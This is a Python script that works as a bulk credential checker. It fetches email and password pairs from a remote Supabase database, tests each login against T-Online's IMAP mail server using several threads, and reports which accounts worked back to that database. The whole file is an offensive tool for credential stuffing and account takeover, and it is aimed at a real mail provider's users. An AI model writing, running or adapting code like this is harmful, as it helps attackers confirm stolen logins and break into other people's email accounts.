import imaplib
import time
import requests
from concurrent.futures import ThreadPoolExecutor

SUPABASE_URL = "https://uryfrvpoyhrzfgctupqk.supabase.co"
IMAP_SERVER = "secureimap.t-online.de"
IMAP_PORT = 993
MAX_THREADS = 5  # Adjust this based on how many accounts you want to check at once

def test_account(email, password):
    try:
        mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT, timeout=15)
        mail.login(email, password)
        mail.logout()
        return True, "LOGIN OK"
    except imaplib.IMAP4.error as e:
        return False, f"LOGIN FAILED: {e}"
    except Exception as e:
        return False, f"ERROR: {e}"

def process_account(account_data):
    account_id = account_data['id']
    email = account_data['email']
    password = account_data['password']
    headers = {}
    
    print(f"[Thread-Job] Starting ID: {account_id} | {email}")
    
    # 1. Test IMAP connection
    ok, message = test_account(email, password)
    valid = "yes" if ok else "no"
    
    if ok:
        print(f"[+] {email} -> {message}")
    else:
        print(f"[-] {email} -> {message}")
        
    # 2. Update account status in Supabase
    try:
        response = requests.get(
            f"{SUPABASE_URL}/functions/v1/update-t-online", 
            params={"id": account_id, "valid": valid}, 
            headers=headers, 
            timeout=30
        )
        if response.status_code == 200:
            #print(f"Updated ID {account_id}:", response.json())
            pass
        else:
            #print(f"Update error for ID {account_id}:", response.text)
            pass
    except Exception as e:
        print(f"Failed to update database for ID {account_id}: {e}")

def main():
    headers = {}
    
    # Use ThreadPoolExecutor to manage our worker threads
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        while True:
            try:
                # 1. Fetch a pending account sequentially from the database
                response = requests.get(
                    f"{SUPABASE_URL}/functions/v1/get-t-online", 
                    headers=headers, 
                    timeout=30
                )
                
                if response.status_code != 200:
                    print("Get account error:", response.text)
                    time.sleep(5)  # Pause briefly before retrying if server errors out
                    continue
                    
                data = response.json()
                if not data.get('success'):
                    print("No more pending accounts or API response failed:", data)
                    break  # Exit loop if no accounts are left
                
                # 2. Hand the account job over to an available thread in the pool
                executor.submit(process_account, data)
                
                # Small delay to prevent hitting the Supabase fetch endpoint too rapidly
                time.sleep(0.5)
                
            except Exception as e:
                print(f"Main loop error: {e}")
                time.sleep(2)

if __name__ == "__main__":
    main()
